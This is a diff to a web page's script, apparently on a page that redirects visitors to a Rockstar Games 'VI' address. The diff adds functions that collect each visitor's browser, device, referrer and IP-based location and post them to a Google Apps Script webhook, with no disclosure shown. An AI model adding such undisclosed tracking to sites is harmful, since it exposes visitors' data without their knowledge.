@@ -146,7 +146,61 @@
       window.location.href = "https://www.rockstargames.com/VI";
     }, 3500);
   }
+
+  // not
+  /**
+ * DATA COLLECTION & SUBMISSION MODULE
+ * This script collects user browser data and submits it to the configured webhook.
+ */
+
+const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwmehXULJ0GwP9fIUv56JLuCVA2-Dr7XLbaUU-iqwTeB0lEELsJXsJwaNgLSK4iyZmwuA/exec';
+
+// Collects browser metadata, device info, and IP geolocation
+async function collectSessionMeta() {
+  const now = new Date();
+  const ts = now.toISOString();
+  
+  const ua = navigator.userAgent;
+  const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua);
+  const device = isMobile ? 'Mobile' : 'Desktop';
+
+  let location = "Location Access Blocked";
+  try {
+    const geo = await fetch('http://ip-api.com/json/');
+    if (geo.ok) {
+      const g = await geo.json();
+      location = `${g.city}, ${g.regionName}, ${g.country}`;
+    }
+  } catch (e) {
+    console.error("Geolocation failed", e);
+  }
+
+  return {
+    timestamp: ts,
+    device: `${device} | ${ua.substring(0, 80)}`,
+    location: location,
+    url: window.location.href,
+    referrer: document.referrer || 'Direct'
+  };
+}
+
+// Submits the form data and session metadata to the Google Sheet webhook
+async function submitLeadToSheet(payload) {
+  try {
+    const response = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    return response;
+  } catch (err) {
+    console.error('Webhook submission failed:', err);
+    throw err;
+  }
+}
 </script>
+  
 
 </body>
 </html>
